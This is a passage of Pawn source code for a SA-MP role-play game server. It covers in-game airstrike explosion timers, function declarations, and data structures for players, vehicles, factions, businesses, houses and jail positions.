            SetTimerEx("AirstrikeGo7",2000,false,"dfffd",playerid,x,y,z,19);

        }
        if(type == 20)
        {

		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer13[i]);
			DestroyObject(Dayer23[i]);
			DestroyObject(Dayer33[i]);
			DestroyObject(Dayer43[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			CreateExplosion(x-2,y,z+30,6,5);
            SetTimerEx("AirstrikeGo7",2000,false,"dfffd",playerid,x,y,z,20);

        }
		if(type == 101)
        {
            CreateExplosion(1326.31482-10,-825.35059+0,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo7",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo7(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer14[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer14[playerid], x-17, y, z+30, 5);
			Dayer24[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer24[playerid], x+17, y, z+30, 5);
			Dayer34[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer34[playerid], x, y-17, z+30, 5);
			Dayer44[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer4[playerid], x, y+17, z+30, 5);

            CreateExplosion(x,y+10,z+30,6,5);
            SetTimerEx("AirstrikeGo8",2000,false,"dfffd",playerid,x,y,z,19);

        }
      if(type == 20)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer14[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer14[playerid], x-17, y, z+30, 5);
			Dayer24[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer24[playerid], x+17, y, z+30, 5);
			Dayer34[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer34[playerid], x, y-17, z+30, 5);
			Dayer44[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer4[playerid], x, y+17, z+30, 5);

            CreateExplosion(x,y+10,z+30,6,5);
            SetTimerEx("AirstrikeGo8",2000,false,"dfffd",playerid,x,y,z,20);

        }
		if(type == 101)
        {
            CreateExplosion(1326.31482,-825.35059+10,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo8",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo8(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer14[i]);
			DestroyObject(Dayer24[i]);
			DestroyObject(Dayer34[i]);
			DestroyObject(Dayer44[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);
			CreateExplosion(x+7,y+2,z+30,6,5);
            SetTimerEx("AirstrikeGo9",2000,false,"dfffd",playerid,x,y,z,19);

        }
        if(type == 20)
        {
		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer14[i]);
			DestroyObject(Dayer24[i]);
			DestroyObject(Dayer34[i]);
			DestroyObject(Dayer44[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);
			CreateExplosion(x+7,y+2,z+30,6,5);
            SetTimerEx("AirstrikeGo9",2000,false,"dfffd",playerid,x,y,z,20);

        }
		if(type == 101)
        {
            CreateExplosion(1326.31482-15,-825.35059+0,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo4",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo9(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer15[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer15[playerid], x-17, y, z+30, 5);
			Dayer25[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer25[playerid], x+17, y, z+30, 5);
			Dayer35[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer35[playerid], x, y-17, z+30, 5);
			Dayer45[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer45[playerid], x, y+17, z+30, 5);

            CreateExplosion(x+10,y+20,z+30,6,5);
            SetTimerEx("AirstrikeGo10",2000,false,"dfffd",playerid,x,y,z,19);

        }
	        if(type == 20)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer15[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer15[playerid], x-17, y, z+30, 5);
			Dayer25[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer25[playerid], x+17, y, z+30, 5);
			Dayer35[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer35[playerid], x, y-17, z+30, 5);
			Dayer45[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer45[playerid], x, y+17, z+30, 5);

            CreateExplosion(x+10,y+20,z+30,6,5);
            SetTimerEx("AirstrikeGo10",2000,false,"dfffd",playerid,x,y,z,20);

        }
		if(type == 101)
        {
            CreateExplosion(1326.31482-20,-825.35059,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo10",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo10(playerid,Float:x,Float:y,Float:z,type)
{
		if(type == 101)
        {

            KillTimer(Timer[playerid]);
        //    CreateExplosion(1326.31482+20,-825.35059,70.26804+30,6,2);
        }
        if(type == 20)
        {
		SendClientMessage(playerid, COLOR_RED , "Hala KhoonSardito Hefz Kon BarMigardi Sarejat :D");
		MoveObject(Balon2[playerid], x, y, z, 7);
		SetTimerEx("AirstrikeGo11",10000,false,"dfffd",playerid,x,y,z,20);
  //  CreateExplosion(x-5,y+20,z+30,6,5);

        }
	     if(type == 19)
        {
		CreateExplosion(x-5,y+20,z+30,6,5);
		}
		for(new i = 0; i < MAX_PLAYERS; i++)

        {
				DestroyObject(Dood[i]);
				DestroyObject(Dood[i]);
				DestroyObject(Dood[i]);
				DestroyObject(Dood[playerid]);
				DestroyObject(Dayer15[i]);
				DestroyObject(Dayer25[i]);
				DestroyObject(Dayer35[i]);
				DestroyObject(Dayer45[i]);
				DestroyObject(Dayer15[i]);
				DestroyObject(Dayer25[i]);
				DestroyObject(Dayer35[i]);
				DestroyObject(Dayer45[i]);
                DestroyObject(TearGas[i]);
                DestroyObject(Flare[i]);
                DestroyObject(TearGas[i]);
                DestroyObject(Flare[i]);
                DestroyObject(Hyd[i]);
				DestroyObject(Balon[i]);
				DestroyObject(Balon[playerid]);
                KillTimer(Timer[i]);
        }

        return 1;
}
Public:AirstrikeGo11(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 20)
        {
    for(new i = 0; i < MAX_PLAYERS; i++)
        {
				DestroyObject(Balon2[i]);
        }

        }
        return 1;
}
Public:AnimTNT(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 1)
        {
						StopLoopingAnim(playerid);
        }
        return 1;
}
forward gron(playerid);
forward gron1(playerid);
forward ChangeColor();
forward CheckPlayers();
forward OnHouseLoad();
forward RandomShomare(min, max);
forward MoneyTimer();
forward settime();
forward IsAGangCar3(carid);
forward IsAGangCar7(carid);
forward IsAGangCar8(carid);
forward IsAGangCar17(carid);
forward IsAGangCar19(carid);
forward IsATCC(carid);
forward IsABike(carid);
forward IsAllCars(carid);
forward IsASRent(carid);
forward LoadHouses();
forward LoadDynamicFactions();
forward SaveDynamicFactions(factionid);
forward LoadDynamicClans();
forward SaveDynamicClans(cid);
forward LoadBizz();
forward LoadSBizz();
forward LoadStuff();
forward SaveStuff();
forward GateTime();
forward GateTime1();
forward GarageLS();
forward sfpdgate1T();
forward sfpdgate2T();
forward areagate1();
forward areagate2();
forward areagate3();
forward GarageLV();
forward GarageLV1();
forward areagate();
forward TTgateT();
forward EVgateT();
forward JailXT();
forward LStoLV(playerid);
forward LStoSF(playerid);
forward LVtoLS(playerid);
forward LVtoSF(playerid);
forward SFtoLV(playerid);
forward SFtoLS(playerid);
forward TTgbalaT();
forward blT1();
forward blT2();
forward blT3();
forward blT4();
forward blT5();
forward bl2T1();
forward bl2T2();
forward bl2T3();
forward bl2T4();
forward bl2T5();
forward bl2T6();
forward bl2T7();
forward bl2T8();
forward bl2T9();
forward bl2T10();
forward obj5T();
forward LoadTurfs();
forward SaveTurfs(turfid);
forward IsAtClothShop(playerid);
forward IsAtGasStation(playerid);
forward IsAtHotdogPlace(playerid);
forward IsAtATMSystem(playerid);
forward IsAtFishPlace(playerid);
forward IsAtBar(playerid);
forward IsAtEatPlace(playerid);
forward IsAtBankk(playerid);
forward DollahScoreUpdate();
forward SetPlayerSpawn(playerid);
forward PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z);
forward CrimInRange(Float:radi, playerid,copid);
forward SendTeamBeepMessage(team, color, string[]);
forward ABroadCast(color,const string[],level);
forward HBroadCast(color,const string[]);
forward GetClosestPlayer(p1);
forward IsPlayerInTurf(playerid, turfid);
forward GetPlayerZone(playerid);
forward PrintBizInfo(playerid,targetid);
forward PrintSBizInfo(playerid,targetid);
forward SetPlayerUnjail();
forward OtherTimer();
new psellername[MAX_PLAYER_NAME];
new pseller[MAX_PLAYERS];
forward KickLog(string[]);
forward MoneyLog(string[]);
forward WarnLog(string[]);
forward FactionLog(string[]);
forward AdminLog(string[]);
forward IsAPlane(carid);
forward IsABoat(carid);
forward IsACop(playerid);
forward IsANr(playerid);
forward IsAPDMember(playerid);
forward IsASFPDMember(playerid);
forward IsAMember(playerid);
forward IsAMemberC(playerid);
forward IsAMemberCl(playerid);
forward IsAnInstructor(playerid);
forward IsAnTaxi(playerid);
forward Float:GetDistanceBetweenPlayers(p1,p2);
forward AddLog(const player[], const taraf[], const harf[], const harf2[], no);
forward SetPlayerCriminal(playerid,declare,reason[],WantedBealave);
forward SetPlayerFree(playerid,declare,reason[]);
forward SetPlayerWeapons(playerid);
forward ShowStats(playerid,targetid);
forward ShowCarInfo(playerid,targetid, MMID);
forward SetPlayerToTeamColor(playerid);
forward warnt(playerid);
forward OnPlayerLogin(playerid);
forward OnPlayerUpdate(playerid);
forward OnPlayerRegister(playerid);
forward BroadCast(color,const string[]);
forward OOCOff(color,const string[]);
forward OOCNews(color,const string[]);
forward OOCADLV(color,const string[]);
forward SendJobMessage(job, color, string[]);
forward SendFamilyMessage(family, color, string[]);
forward SendClanMessage(clan, color, string[]);
forward SendTeamMessage(team, color, string[]);
forward SendRadioMessage(member, color, string[]);
forward SendAdminMessage(color, string[]);
forward SendAdminMessageg(color, string[]);
forward SendLeaderMessage(color, string[]);
forward SendLeadermMessage(color, string[]);
forward SendMemberMessage(color, string[]);
forward ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5);
forward ProxDetectorS(Float:radi, playerid, targetid);
forward ClearMarriage(playerid);
forward Lotto(number);
forward CarTow(carid);
forward LockCar(carid);
forward UnLockCar(carid);
forward Fillup(i);
forward SyncTime();
forward SyncUp();
forward SaveAccounts();
forward PayDay();
forward ini_GetKey( line[] );
forward ini_GetValue( line[] );
forward PlayerPlayMusic(playerid);
forward StopMusic();
forward PlayerFixRadio(playerid);
forward PlayerFixRadio2();
forward CustomPickups();
forward FixHour(hour);
forward IsPlayerInArea(playerid, Float:minx, Float:maxx, Float:miny, Float:maxy);
forward Float:GetDistance(playerid, Float:x, Float:y);
forward IsAtCnn(playerid);
forward busstop1(playerid);
forward busstop2(playerid);
forward busstop3(playerid);
forward busstop4(playerid);
forward busstop5(playerid);
forward busstop6(playerid);
forward busstop7(playerid);
forward busstop8(playerid);
forward busstop9(playerid);
forward busstop10(playerid);
forward busstop11(playerid);
forward busstop12(playerid);
forward busstop13(playerid);
forward busstop14(playerid);
forward busstop15(playerid);
forward busstop16(playerid);
forward busstop17(playerid);
forward busstop18(playerid);
forward busstop19(playerid);
forward busstop20(playerid);
new gID[15];
forward busstop21(playerid);
forward busstop22(playerid);
forward busstop23(playerid);
forward busstop24(playerid);
forward busstop25(playerid);
forward busstop26(playerid);
forward busstop27(playerid);
forward busstop28(playerid);
forward busstop29(playerid);
forward migamloginkon(playerid);
forward SPeedKm();
forward IsInFaction(plyid);
forward speedcheck(playerid,speed);
forward IsPlayerInHQ(playerid);
forward SaveComponent(vehicleid,componentid);
forward RandomMessage();
new Text:ShadowsRandom;
new RandomMessages[][] =
{
    "~r~JoKeR ~b~GaminG ~w~Role Play",
    "Khosh Amadid",
    "Baraye moshahede adminha  >> type ~r~/admins",
    "soal dari?  ~g~/help",
    "Soal Dari? ~b~/Helpme/",
	""
};
new Float:Sherkatcp[][4] = // at the top
{
    {2514.9038,2320.6052,10.8203},
    {2368.1885,2757.7969,10.8203},
    {2115.9248,2712.7786,10.8203}
};
/*----------------------------------**ENUMS**---------------------------------*/
enum Factions
{
    fSQLid,
    fName[50],
    Float:ffX,
    Float:ffY,
    Float:ffZ,
    fMats,
    fDrugs,
    fBank
};
enum Clans
{
    cSQLid,
    cName[50],
    cTag[50],
    cSlot,
    cSlots
};
enum rInfo
{
    sCreated,
    Float:sX,
    Float:sY,
    Float:sZ,
    sObject,
};
new Roadblocks[MAX_ROADBLOCKS][rInfo];
enum pInfo
{
    pName[40],
    pKey[128],
    pLevel,
    pAdmin,
    pVip,
    pPremiumAccount,
    pConnectTime,
    pAFKtime,
    pPinCode,
    pReg,
    pRegistredDate[24],
    pLastLogin[64],
    pSex,
    pRented,
    pMuteTime,
    pExp,
    pCash,
    pAccount,
    pCrimes,
    pKills,
    pDeaths,
	pOnline,
    pArrested,
    pWantedDeaths,
    pPhoneBook,
    pLottoNr,
    pFishes,
    pJob,
    Float:pPayCheck,
    pHeadValue,
    pJailTime,
    pMats,
    pDrugs,
    pLeader,
    pTow,
    pSTAFF,
    pMember,
    pPunish,
    pFwarn,
    pRank,
    cSkin,
    fSkin,
    pWalkieTalkie,
    pDetSkill,
    pLawSkill,
    pMechSkill,
    pJackSkill,
    pNewsSkill,
    pDrugsSkill,
    pMatsSkill,
    pTeam,
    pPnumber,
    pPhousekey,
    pCar,
    pRob,
    pRobSkill,
    pPbiskey,
    pCarLic,
    pFlyLic,
    pBoatLic,
    pFishLic,
    pGunLic,
    pMatsLic,
    pCarLicS,
    pFlyLicS,
    pBoatLicS,
    pGunLicS,
    pMatsLicS,
    pCarTime,
    pPayDayHad,
    pTut,
    pWarns,
    pCanistra,
    pMarriedTo[128],
    pLighter,
    pCigarettes,
    pSpeaker,//save nemishavad
    pLanguage,
    pLawyerPoint,
    pApproval,
    pWanted,
    Float:cLocationx,
    Float:cLocationy,
    Float:cLocationz,
    Float:cAngle,
    cColor1,
    cColor2,
    cModel,
    cPrice,
    cPlate[128],
    cLock,
    cDestroyed,
    cFuel,
    Float:cHealth,
    cMod1,
    cMod3,
    cMod4,
    cMod5,
    cMod6,
    cMod7,
    cMod8,
    cMod9,
    cMod10,
    cMod11,
    cMod12,
    cMod13,
    cMod14,
    cMod15,
    cMod16,
    cMod17,
    cPaintJob,
    Float:cKilo,
    cPanel,
    cDoors,
    cLights,
    cTires,
    cFixed,
    pEmail[128],
    pBanned,
    pIp[100],
    pBannedBy[40],
    pBanTime[260],
    pBanReason[128],
    cInsurance,
    pID,
    pHelper,
    pGetHitTime,
    pCar_2,
    Float:cLocationx_2,
    Float:cLocationy_2,
    Float:cLocationz_2,
    Float:cAngle_2,
    cColor1_2,
    cColor2_2,
    cModel_2,
    cPrice_2,
    cPlate_2[128],
    cLock_2,
    cDestroyed_2,
    cFuel_2,
    Float:cHealth_2,
    cMod1_2,
    cMod3_2,
    cMod4_2,
    cMod5_2,
    cMod6_2,
    cMod7_2,
    cMod8_2,
    cMod9_2,
    cMod10_2,
    cMod11_2,
    cMod12_2,
    cMod13_2,
    cMod14_2,
    cMod15_2,
    cMod16_2,
    cMod17_2,
    cPaintJob_2,
    Float:cKilo_2,
    cPanel_2,
    cDoors_2,
    cLights_2,
    cTires_2,
    cFixed_2,
    cInsurance_2,
    pReferral,
    Float:gLocationX,
    Float:gLocationY,
    Float:gLocationZ,
    Float:gAngle,
    Float:gLocationX_2,
    Float:gLocationY_2,
    Float:gLocationZ_2,
    Float:gAngle_2,
    gParked,
    gParked_2,
    pBanDays,
    pClan,
    pcRank,
    pRep,
    pCwarn,
    pGold,
	pGetWeb,
	pLav,
	pHav,
	pCar_3,
	pVeh1,
	pVeh2,
	pVeh3,
	pVeh4,
	pVeh5,
	pVeh6,
	pPExpire[24],
	pPDay,
	pCar_5,
	pCar_6,
	pCar_4,
	pAav,
	pBio[256]
};

enum zInfo
{
    zSQLid,
    zOwner[64],
    Float:zMinX,
    Float:zMinY,
    Float:zMaxX,
    Float:zMaxY
};

enum newsenum
{
    Sender[MAX_PLAYER_NAME],
    Text[256]
};

enum czInfo
{
        Text3D:ci3D,
        ciObjID,
        bool:ciOpened,
        Float:CellOpenx,
        Float:CellOpenY,
        Float:CellOpenZ,
        Float:CellCloseX,
        Float:CellCloseY,
        Float:CellCloseZ,
        Float:CellOpenRotX,
        Float:CellOpenRotY,
        Float:CellOpenRotZ,
        Float:CellCloseRotX,
        Float:CellCloseRotY,
        Float:CellCloseRotZ
};

enum SAZONE_MAIN
{
        SAZONE_NAME[28],
        Float:SAZONE_AREA[6]
};

enum pHaul
{
    pCapasity,
    pLoad
};

enum sbInfo
{
    sbSQLid,
    sbOwned,
    sbOwner[64],
    sbMessage[128],
    Float:sbEntranceX,
    Float:sbEntranceY,
    Float:sbEntranceZ,
    sbLevelNeeded,
    sbBuyPrice,
    sbEntranceCost,
    sbTill,
    sbProducts,
    sbMaxProducts,
    sbPriceProd,
    sbForosh
};

enum bInfo
{
    bSQLid,
    bOwned,
    bOwner[64],
    bMessage[128],
    Float:bEntranceX,
    Float:bEntranceY,
    Float:bEntranceZ,
    Float:bExitX,
    Float:bExitY,
    Float:bExitZ,
    bLevelNeeded,
    bBuyPrice,
    bEntranceCost,
    bTill,
    bLocked,
    bInterior,
    bProducts,
    bMaxProducts,
    bPriceProd,
    bVW,
    bForosh
};

enum hInfo
{
    hSQLID,
    Float:hEntrancex,
    Float:hEntrancey,
    Float:hEntrancez,
    Float:hExitx,
    Float:hExity,
    Float:hExitz,
    hOwner[MAX_PLAYER_NAME],
    hValue,
    hHel,
    hInt,
    hLock,
    hOwned,
    hRent,
    hRentabil,
    hTakings,
    hLevel,
    hWorld,
    hForosh
};
/*----------------------------------------------------------------------------*/
static PlayerSetFreq[MAX_PLAYERS][10],
    CallWaiting[MAX_PLAYERS],
    LastPID,
	TimerRingTone[MAX_PLAYERS],
	bool:GodmodeFeature[MAX_PLAYERS],
	randomsm[MAX_PLAYERS],
	IHaveKey[MAX_PLAYERS],
	IHaveKey_2[MAX_PLAYERS],
	Cheating2[MAX_PLAYERS],
	residam[MAX_PLAYERS],
	Cheating2Nex[MAX_PLAYERS],
	barrierlv,
	barrierls,
	garagels,
	AreaGate,
	garagelv,
	garagelv1,
	area1gate1,
	area2gate1,
	area3gate1,
	area1gate2,
	area2gate2,
	area1gate3,
	area2gate3,
	gPlayerAnimLibsPreloaded[MAX_PLAYERS],
	//DamageInfo[MAX_PLAYERS][diInfo],
	Trashes[MAX_PLAYERS],
	OnAshghal[MAX_PLAYERS],
	Trashlevel[MAX_PLAYERS],
	TurfAttacker[MAX_PLAYERS],
	TurfKhod[MAX_PLAYERS],
	KillsAttacker[MAX_PLAYERS],
	DeathsAttacker[MAX_PLAYERS],
	KillsKhod[MAX_PLAYERS],
	DeathsKhod[MAX_PLAYERS],
	OnWar[MAX_PLAYERS],
	KillsAttackerTurf[MAX_PLAYERS],
	DeathsAttackerTurf[MAX_PLAYERS],
	KillsKhodTurf[MAX_PLAYERS],
	DeathsKhodTurf[MAX_PLAYERS],
	ScoreAttacker[MAX_PLAYERS],
	ScoreKhod[MAX_PLAYERS],
	bool:EventGotoHave = false,
	bool:EventHave = false,
	EventOrg = INVALID_PLAYER_ID,
	EventReward[MAX_PLAYERS],
	EventTime[MAX_PLAYERS][20],
	EventLocation[MAX_PLAYERS][60],
	EventDesc[MAX_PLAYERS][80],
	EventID[MAX_PLAYERS],
	bool:EventIDUsed[1001],
	EventIDOrg[1001],
	EventTitle[MAX_PLAYERS][60],
	bool:TogEvent[MAX_PLAYERS],
	bool:OnRob[MAX_PLAYERS],
	bool:RobLeader[MAX_PLAYERS],
	RobDriver[MAX_PLAYERS],
	RobMember[MAX_PLAYERS][100],
	RobMemberCount[MAX_PLAYERS],
	OwnableCarMethod[MAX_PLAYERS],
	light,
	light2,
	light3,
	light4,
	light5,
	neon1,
	neon2,
	neon3,
	neon4,
	neon5,
	neon6,
	neon7,
	MostPlayersOnline,
	CarRadio[MAX_VEHICLES][600],
	bool:CarRadioPlayed[MAX_PLAYERS],
	TeadadPlayers,
	carneon1[MAX_VEHICLES] = 1,
	carneon2[MAX_VEHICLES] = 1,
    carneon3[MAX_VEHICLES] = 1,
    carneon4[MAX_VEHICLES] = 1,
    carneon5[MAX_VEHICLES] = 1,
	//carneon6[MAX_VEHICLES] = 1,
	//carneon7[MAX_VEHICLES] = 1,
	MashinRenter[MAX_VEHICLES],
	bool:OnRentMashinMessage[MAX_PLAYERS],
//	bulletneonn1 = 1,
//	bulletneonn2 = 1,
	taxiicon1,
	taxiicon2,
	ManMitoonamSkin[MAX_PLAYERS],
	TruckLevel[MAX_PLAYERS],
	OldCar[MAX_PLAYERS],
	TruckAllowed[MAX_PLAYERS],
	Text:KiloTextDraw[MAX_PLAYERS],
	Text:DoorsLockTextDraw[MAX_PLAYERS],
	Text:DoorsLockTextDraw2[MAX_PLAYERS],
	MyPayMin[MAX_PLAYERS],
	Megaphonetext[MAX_PLAYERS][100],
	bool:RequestSelected[MAX_PLAYERS],
	handle,
	teadadacc,
	jadidacc[40],
	teadadeban,
	TurfShow[MAX_PLAYERS],
	errormessage[MAX_PLAYERS],
	errormessage2[MAX_PLAYERS],
	Text:Time, Text:Date,
	TooBiz[MAX_PLAYERS],
	TooHouse[MAX_PLAYERS],
	adtextplayer[MAX_PLAYERS][512],
	bulletlight1,
	bulletlight2,
	bulletneon1,
	bulletneon2,
	bullettext1,
	bullettext2,
	Text:SpeedoTextDraw[MAX_PLAYERS],
	Text:FuelTextDraw[MAX_PLAYERS],
	DarsadBenzin[MAX_VEHICLES],
	Benzin[MAX_VEHICLES],
	ManTooBusam[MAX_PLAYERS],
	HelpmeDLG[MAX_PLAYERS][MAX_PLAYERS],
	SelectedRequest[MAX_PLAYERS],
	ReportDLG[MAX_PLAYERS][MAX_PLAYERS],
	WDLG[MAX_PLAYERS][MAX_PLAYERS],
	SelectedRRequest[MAX_PLAYERS],
	SelectedWRequest[MAX_PLAYERS],
	Text3D:houser[1100],
	Text3D:bizer[81],
	Text3D:sbizer[34],
	Text:TD_Site,
	Text:TD_Site1,
	Text:TD_LoadingAccount[3],
	Text:AccountBar[4],
	Text:TD_Exam[MAX_PLAYERS][3],
	Float:PPos[MAX_PLAYERS][3],
	Float:Khoon[MAX_PLAYERS],
	Float:Zereh[MAX_PLAYERS],
	PlayerRespawned[MAX_PLAYERS],
	tcc1,
	tcc2,
	tcc3,
	tcc4,
	tcc5,
	tcc6,
	tcc7,
	Mahal[MAX_PLAYERS],
	ExamVeh[7],
	obj5,
	   Balsys1,
	   Balsys2,
	  // Balsys3,
	  // Balsys4,
	  // Balsys5,
	  // Balsys6,
	sp1,
	sp2,
	sp3,
	sp4,
	sp5,
	stfcar,
	stfcar1,
	stfcar2,
	stfcar3,
	stfcar4,
	stfcar5,
	stfcar6,
	stfcar7,
	stfcar8,
	stfcar9,
	stfcar10,
	stfcar11,
	stfcar12,
	stfcar13,
	stfcar14,
	stfcar15,
	stfcar16,
	stfcar17,
	stfcar18,
	stfcar19,
	stfcar20,
	stfcar21,
	stfcar22,
	stfcar23,
	stfcar24,
	stfcar25,
	stfcar26,
	stfcar27,
	stfcar28,
	stfcar29,
	stfcar30,
	stfcar31,
	stfcar32,
	stfcar33,
	stfcar34,
	stfcar35,
	ttcar,
	ttcar1,
	ttcar2,
	ttcar3,
	ttcar4,
	ttcar5,
	ttcar6,
	ttcar7,
	ttcar8,
	ttcar9,
	ttcar10,
	ttcar11,
	ttcar12,
	ttcar13,
	ttcar14,
	ttcar15,
	evcar,
	evcar1,
	evcar2,
	evcar3,
	evcar4,
	evcar5,
	evcar6,
	evcar7,
	evcar8,
	evcar9,
	evcar10,
	evcar11,
	evcar12,
	ggcar,
	ggcar1,
	ggcar2,
	ggcar3,
	ggcar4,
	ggcar5,
	ggcar6,
	ggcar7,
	ggcar8,
	ggcar9,
	ggcar10,
	ggcar11,
	ggcar12,
	ggcar13,
	ggcar14,
	ggcar15,
	ggcar16,
	ggcar17,
	ggcar18,
	ggcar19,
	ggcar20,
	ggcar21,
	ggcar22,
	ggcar23,
	ggcar24,
	tboy1,
	tboy2,
	tboy3,
	tboy4,
	tboy5,
	tboy6,
	tboy7,
	tboy8,
	tboy9,
	tboy11,
	tboy12,
	tboy13,
	tboy14,
	tboy15,
	tboy16,
	tboy18,
	tboy19,
	tboy20,
	tboy21,
	Mat[MAX_PLAYERS],
	bool:LockEngine[MAX_VEHICLES],
	weapon[MAX_PLAYERS],
	ammo[MAX_PLAYERS],
	GunPricee[MAX_PLAYERS],
	Tofang[MAX_PLAYERS],
	AFKTime[MAX_PLAYERS],
	bool:IsPlayerDeath[MAX_PLAYERS],
	bool:HLapTop[MAX_PLAYERS],
	ReferralID[MAX_PLAYERS],
	bool:TDShowedSpeedo[MAX_PLAYERS],
	bool:TDShowedFuel[MAX_PLAYERS],
	bool:TDShowedKilo[MAX_PLAYERS],
	bool:TDShowedLock[MAX_PLAYERS],
	bool:TDShowedLock2[MAX_PLAYERS],
	bool:JailGateOpen = false,
	//bool:TTgateopen = false,
	JailGate,
	TTgate,
	EVgate,
	JailX,
	sfpdgate1,
	sfpdgate2,
	Text3D:JailGate3D,
	loliaia,
	Float:BiroonJail[][3] =
	{
    {0.0,0.0,0.0},
    {1752.083862,-1541.113281,1997.359497},
    {1752.082885,-1545.398437,1997.359497},
    {1752.082763,-1549.645385,1997.359497},
    {1752.083251,-1553.962402,1997.359497},
    {1752.083251,-1558.215698,1997.359497},
    {1752.083740,-1562.391357,1997.359497},
    {1752.082641,-1566.698120,1997.359497},
    {1752.083862,-1570.976562,1997.359497},
    {1752.084594,-1575.259521,1997.359497},
    {1771.253295,-1541.112792,1997.359497},
    {1771.252563,-1545.354980,1997.359497},
    {1771.254150,-1549.641235,1997.359497},
    {1771.253173,-1553.889038,1997.359497},
    {1771.251220,-1558.151123,1997.359497},
    {1771.253784,-1562.366699,1997.359497},
    {1771.253173,-1566.616699,1997.359497},
    {1771.253662,-1570.905883,1997.359497},
    {1771.253295,-1575.167358,1997.359497},
    {1752.086425,-1575.277954,1993.670043},
    {1752.084838,-1571.028442,1993.670043},
    {1752.085449,-1566.716064,1993.670043},
    {1752.086791,-1562.378295,1993.670043},
    {1752.083129,-1558.134643,1993.670043},
    {1752.083496,-1553.905761,1993.670043},
    {1752.083740,-1549.625244,1993.670043},
    {1752.082763,-1545.367065,1993.670043},
    {1752.082641,-1541.039184,1993.670043},
    {1771.253662,-1541.114746,1993.670043},
    {1771.251586,-1545.303466,1993.670043},
    {1771.249633,-1549.599121,1993.670043},
    {1771.252319,-1553.864135,1993.670043},
    {1771.252929,-1558.091064,1993.670043},
    {1771.254150,-1562.364013,1993.670043},
    {1771.253784,-1566.570922,1993.670043},
    {1771.252685,-1570.878662,1993.670043},
    {1771.248291,-1575.180053,1993.670043}
    },
    Float:InJail[][3] =
    {
    {1750.071777,-1541.135986,1997.359497},
    {1749.998168,-1545.273071,1997.359497},
    {1750.359252,-1549.584350,1997.359497},
    {1750.567871,-1553.921630,1997.359497},
    {1750.094238,-1558.172973,1997.359497},
    {1750.141113,-1562.449829,1997.359497},
    {1749.876464,-1566.671630,1997.359497},
    {1749.939575,-1570.887451,1997.359497},
    {1749.932983,-1575.385131,1997.359497},
    {1772.988281,-1540.895019,1997.359497},
    {1772.844238,-1545.179931,1997.359497},
    {1772.980224,-1549.397460,1997.359497},
